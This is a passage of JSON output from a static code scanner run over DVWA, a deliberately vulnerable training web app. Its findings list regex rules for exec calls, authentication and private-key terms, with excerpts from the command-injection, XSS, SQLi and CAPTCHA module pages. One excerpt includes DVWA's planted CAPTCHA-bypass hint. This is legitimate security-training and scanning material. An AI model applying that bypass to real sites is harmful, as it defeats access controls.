        "ruleDescription": "Function: Execute",
        "pattern": "\\b(exec)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Functions.execute"
        ],
        "sample": "exec",
        "excerpt": "$page[ &#39;title&#39; ]   = &#39;Vulnerability: Command Injection&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;exec&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;exec&#39;;\n$page[ &#39;source_button&#39; ] = &#39;exec&#39;;\n\ndvwaDatabaseConnect();\n\n$vulnerabilityFile = &#39;&#39;;\nswitch( $_COOKIE[ &#39;security&#39; ] ) {\n",
        "startLocationLine": 12,
        "startLocationColumn": 29,
        "endLocationLine": 12,
        "endLocationColumn": 33
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/index.php",
        "ruleId": "DH000002",
        "ruleName": "Functions: Execute",
        "ruleDescription": "Function: Execute",
        "pattern": "\\b(exec)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Functions.execute"
        ],
        "sample": "exec",
        "excerpt": "\t\tbreak;\n}\n\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &quot;vulnerabilities/exec/source/{$vulnerabilityFile}&quot;;\n\n$page[ &#39;body&#39; ] .= &quot;\n&lt;div class=\\&quot;body_padded\\&quot;&gt;\n\t&lt;h1&gt;Vulnerability: Command Injection&lt;/h1&gt;\n\n",
        "startLocationLine": 32,
        "startLocationColumn": 55,
        "endLocationLine": 32,
        "endLocationColumn": 59
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/exec/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: Command Injection&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;exec&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;exec&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/xss_s/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: Stored Cross Site Scripting (XSS)&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;xss_s&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;xss_s&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/xss_d/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: DOM Based Cross Site Scripting (XSS)&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;xss_d&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;xss_d&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/weak_id/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: Weak Session IDs&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;weak_id&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;weak_id&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/session-input.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ] = &#39;SQL Injection Session Input&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n\nif( isset( $_POST[ &#39;id&#39; ] ) ) {\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: SQL Injection&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;sqli&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;sqli&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/sqli/index.php",
        "ruleId": "AI011610",
        "ruleName": "Data: DBMS (SQL)",
        "ruleDescription": "Data: DBMS (SQL)",
        "pattern": "\\b(mysql)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Data.DBMS.SQL"
        ],
        "sample": "mysql",
        "excerpt": "\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://www.securiteam.com/securityreviews/5DP0N1P76E.html&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://en.wikipedia.org/wiki/SQL_injection&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;https://www.owasp.org/index.php/SQL_Injection&#39; ) . &quot;&lt;/li&gt;\n\t\t&lt;li&gt;&quot; . dvwaExternalLinkUrlGet( &#39;http://bobby-tables.com/&#39; ) . &quot;&lt;/li&gt;\n\t&lt;/ul&gt;\n&lt;/div&gt;\\n&quot;;\n\n",
        "startLocationLine": 88,
        "startLocationColumn": 87,
        "endLocationLine": 88,
        "endLocationColumn": 92
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csp/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: Content Security Policy (CSP) Bypass&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;csp&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;csp&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/xss_r/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: Reflected Cross Site Scripting (XSS)&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;xss_r&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;xss_r&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "require_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &quot;external/recaptcha/recaptchalib.php&quot;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: Insecure CAPTCHA&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;captcha&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;captcha&#39;;\n",
        "startLocationLine": 7,
        "startLocationColumn": 26,
        "endLocationLine": 7,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI007400",
        "ruleName": "Cryptography: Encryption (RSA)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "RSA.*encrypt|RSA.*decrypt|public.?key|private.?key|privkey|pubkey",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Cipher.RSA"
        ],
        "sample": "public_key",
        "excerpt": "\n// Check if we have a reCAPTCHA key\n$WarningHtml = &#39;&#39;;\nif( $_DVWA[ &#39;recaptcha_public_key&#39; ] == &quot;&quot; ) {\n\t$WarningHtml = &quot;&lt;div class=\\&quot;warning\\&quot;&gt;&lt;em&gt;reCAPTCHA API key missing&lt;/em&gt; from config file: &quot; . realpath( getcwd() . DIRECTORY_SEPARATOR . DVWA_WEB_PAGE_TO_ROOT . &quot;config&quot; . DIRECTORY_SEPARATOR . &quot;config.inc.php&quot; ) . &quot;&lt;/div&gt;&quot;;\n\t$html = &quot;&lt;em&gt;Please register for a key&lt;/em&gt; from reCAPTCHA: &quot; . dvwaExternalLinkUrlGet( &#39;https://www.google.com/recaptcha/admin/create&#39; );\n\t$hide_form = true;\n}\n\n",
        "startLocationLine": 38,
        "startLocationColumn": 24,
        "endLocationLine": 38,
        "endLocationColumn": 34
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI007400",
        "ruleName": "Cryptography: Encryption (RSA)",
        "ruleDescription": "Cryptography: Encryption",
        "pattern": "RSA.*encrypt|RSA.*decrypt|public.?key|private.?key|privkey|pubkey",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.Cipher.RSA"
        ],
        "sample": "public_key",
        "excerpt": "\t\t\tConfirm new password:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password_conf\\&quot;&gt;&lt;br /&gt;\n\n\t\t\t&quot; . recaptcha_get_html( $_DVWA[ &#39;recaptcha_public_key&#39; ] );\nif( $vulnerabilityFile == &#39;high.php&#39; )\n\t$page[ &#39;body&#39; ] .= &quot;\\n\\n\t\t\t&lt;!-- **DEV NOTE**   Response: &#39;hidd3n_valu3&#39;   &amp;&amp;   User-Agent: &#39;reCAPTCHA&#39;   **/DEV NOTE** --&gt;\\n&quot;;\n\nif( $vulnerabilityFile == &#39;high.php&#39; || $vulnerabilityFile == &#39;impossible.php&#39; )\n\t$page[ &#39;body&#39; ] .= &quot;\\n\t\t\t&quot; . tokenField();\n",
        "startLocationLine": 73,
        "startLocationColumn": 47,
        "endLocationLine": 73,
        "endLocationColumn": 57
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "Insecure",
        "excerpt": "dvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: Insecure CAPTCHA&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;captcha&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;captcha&#39;;\n$page[ &#39;source_button&#39; ] = &#39;captcha&#39;;\n\ndvwaDatabaseConnect();\n",
        "startLocationLine": 10,
        "startLocationColumn": 38,
        "endLocationLine": 10,
        "endLocationColumn": 46
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/captcha/index.php",
        "ruleId": "AI027500",
        "ruleName": "Hygiene: Suspicious Comment",
        "ruleDescription": "Hygiene: Suspicious Comment",
        "pattern": "hack|insecure|black magic|high risk|risky|riskiest|obfuscation|obfuscate|obfuscated",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Miscellaneous.CodeHygiene.Comment.Suspicious"
        ],
        "sample": "Insecure",
        "excerpt": "\n$page[ &#39;body&#39; ] .= &quot;\n\t&lt;div class=\\&quot;body_padded\\&quot;&gt;\n\t&lt;h1&gt;Vulnerability: Insecure CAPTCHA&lt;/h1&gt;\n\n\t{$WarningHtml}\n\n\t&lt;div class=\\&quot;vulnerable_code_area\\&quot;&gt;\n\t\t&lt;form action=\\&quot;#\\&quot; method=\\&quot;POST\\&quot; &quot;;\n",
        "startLocationLine": 46,
        "startLocationColumn": 21,
        "endLocationLine": 46,
        "endLocationColumn": 29
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/upload/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: File Upload&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;upload&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;upload&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/upload/index.php",
        "ruleId": "AI040400",
        "ruleName": "Authorization: Permissions",
        "ruleDescription": "Authorization: Permissions",
        "pattern": "\\b(permissions*)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authorization.Permissions"
        ],
        "sample": "permissions",
        "excerpt": "// Check if folder is writeable\n$WarningHtml = &#39;&#39;;\nif( !is_writable( $PHPUploadPath ) ) {\n\t$WarningHtml .= &quot;&lt;div class=\\&quot;warning\\&quot;&gt;Incorrect folder permissions: {$PHPUploadPath}&lt;br /&gt;&lt;em&gt;Folder is not writable.&lt;/em&gt;&lt;/div&gt;&quot;;\n}\n// Is PHP-GD installed?\nif( ( !extension_loaded( &#39;gd&#39; ) || !function_exists( &#39;gd_info&#39; ) ) ) {\n\t$WarningHtml .= &quot;&lt;div class=\\&quot;warning\\&quot;&gt;The PHP module &lt;em&gt;GD is not installed&lt;/em&gt;.&lt;/div&gt;&quot;;\n}\n",
        "startLocationLine": 37,
        "startLocationColumn": 59,
        "endLocationLine": 37,
        "endLocationColumn": 70
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: Brute Force&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;brute&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;brute&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "\t&lt;h1&gt;Vulnerability: Brute Force&lt;/h1&gt;\n\n\t&lt;div class=\\&quot;vulnerable_code_area\\&quot;&gt;\n\t\t&lt;h2&gt;Login&lt;/h2&gt;\n\n\t\t&lt;form action=\\&quot;#\\&quot; method=\\&quot;{$method}\\&quot;&gt;\n\t\t\tUsername:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;text\\&quot; name=\\&quot;username\\&quot;&gt;&lt;br /&gt;\n\t\t\tPassword:&lt;br /&gt;\n",
        "startLocationLine": 40,
        "startLocationColumn": 7,
        "endLocationLine": 40,
        "endLocationColumn": 12
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "\t\t\tPassword:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;\\n&quot;;\n\nif( $vulnerabilityFile == &#39;high.php&#39; || $vulnerabilityFile == &#39;impossible.php&#39; )\n\t$page[ &#39;body&#39; ] .= &quot;\t\t\t&quot; . tokenField();\n\n$page[ &#39;body&#39; ] .= &quot;\n",
        "startLocationLine": 48,
        "startLocationColumn": 35,
        "endLocationLine": 48,
        "endLocationColumn": 40
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/brute/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "Login",
        "excerpt": "\t\t\tPassword:&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;password\\&quot; AUTOCOMPLETE=\\&quot;off\\&quot; name=\\&quot;password\\&quot;&gt;&lt;br /&gt;\n\t\t\t&lt;br /&gt;\n\t\t\t&lt;input type=\\&quot;submit\\&quot; value=\\&quot;Login\\&quot; name=\\&quot;Login\\&quot;&gt;\\n&quot;;\n\nif( $vulnerabilityFile == &#39;high.php&#39; || $vulnerabilityFile == &#39;impossible.php&#39; )\n\t$page[ &#39;body&#39; ] .= &quot;\t\t\t&quot; . tokenField();\n\n$page[ &#39;body&#39; ] .= &quot;\n",
        "startLocationLine": 48,
        "startLocationColumn": 50,
        "endLocationLine": 48,
        "endLocationColumn": 55
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/csrf/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
        "excerpt": "define( &#39;DVWA_WEB_PAGE_TO_ROOT&#39;, &#39;../../&#39; );\nrequire_once DVWA_WEB_PAGE_TO_ROOT . &#39;dvwa/includes/dvwaPage.inc.php&#39;;\n\ndvwaPageStartup( array( &#39;authenticated&#39;, &#39;phpids&#39; ) );\n\n$page = dvwaPageNewGrab();\n$page[ &#39;title&#39; ]   = &#39;Vulnerability: Cross Site Request Forgery (CSRF)&#39; . $page[ &#39;title_separator&#39; ].$page[ &#39;title&#39; ];\n$page[ &#39;page_id&#39; ] = &#39;csrf&#39;;\n$page[ &#39;help_button&#39; ]   = &#39;csrf&#39;;\n",
        "startLocationLine": 6,
        "startLocationColumn": 26,
        "endLocationLine": 6,
        "endLocationColumn": 39
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/index.php",
        "ruleId": "AI040000",
        "ruleName": "Authentication: General",
        "ruleDescription": "Authentication: General",
        "pattern": "\\b(principal|identity|auth|authenticated|authentication|log(in|on)|log(off|out)|signin|sign-?in|signout|sign-?out|networkcredential)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Critical",
        "tags": [
          "Authentication.General"
        ],
        "sample": "authenticated",
